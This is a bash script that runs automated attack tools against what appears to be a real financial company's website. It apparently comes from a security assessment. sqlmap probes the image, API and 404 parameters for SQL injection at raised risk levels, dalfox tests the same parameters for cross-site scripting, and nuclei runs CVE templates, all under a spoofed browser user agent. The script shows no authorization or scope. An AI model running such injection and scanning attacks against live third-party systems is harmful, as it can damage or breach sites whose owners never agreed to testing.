#!/bin/bash
# Required-method tool run: sqlmap + dalfox on the _next/image sink params
B="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
O=tool_outputs
mkdir -p $O

# control: confirm sqlmap is functional against a KNOWN-injectable local check
echo "### sqlmap version"; sqlmap --version 2>&1 | head -2

# 1. /_next/image  -p url,w,q   (the real image-url sink)
echo "### sqlmap /_next/image -p url,w,q"
sqlmap -u "$B/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75" \
  -p "url,w,q" --batch --smart --level=3 --risk=2 --timeout=10 --retries=1 \
  --user-agent="$UA" -o $O/sqlmap_next_image.log 2>&1 | tail -25

# 2. /api/
echo "### sqlmap /api/"
sqlmap -u "$B/api/?id=1" -p "id" --batch --level=3 --risk=2 --timeout=10 --retries=1 \
  --user-agent="$UA" -o $O/sqlmap_api.log 2>&1 | tail -20

# 3. /404
echo "### sqlmap /404"
sqlmap -u "$B/404?search=1" -p "search" --batch --level=3 --risk=2 --timeout=10 --retries=1 \
  --user-agent="$UA" -o $O/sqlmap_404.log 2>&1 | tail -20

# 4. dalfox on the same params (XSS half of the required method)
echo "### dalfox /_next/image"
dalfox url "$B/_next/image?url=1&w=2&q=3" --silence --no-color --no-spinner 2>&1 | tail -10
echo "### dalfox /404"
dalfox url "$B/404?search=1" --silence --no-color --no-spinner 2>&1 | tail -10
echo "### nuclei (CVE/tech templates)"
nuclei -u "$B" -silent -rate-limit 5 -t /usr/share/nuclei-templates/cves/ 2>&1 | tail -15
echo "### nuclei on discovered paths"
for p in /api/ /404 /_next/image /atom.xml; do nuclei -u "$B$p" -silent -rate-limit 5 2>&1 | tail -4; done
echo "=== ALLDONE ==="
